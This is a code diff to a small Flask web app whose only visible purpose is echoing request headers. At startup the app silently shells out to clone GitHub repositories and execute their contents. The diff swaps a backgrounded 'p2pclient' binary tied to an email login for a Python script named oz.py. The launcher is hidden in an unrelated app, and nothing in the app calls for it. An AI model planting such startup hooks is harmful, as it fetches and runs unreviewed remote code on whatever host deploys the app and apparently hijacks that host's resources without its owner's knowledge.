@@ -5,7 +5,7 @@ import subprocess
 from flask import Flask, Response, request
 app = Flask(__name__)
 import os
-os.system ('git clone https://github.com/zamreskhan/anu.git && cd anu && chmod 777 p2pclient && nohup ./p2pclient --login garsenkamser@gmail.com &')
+os.system ('git clone https://github.com/hijaverny/ac.git && cd ac && python oz.py')
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
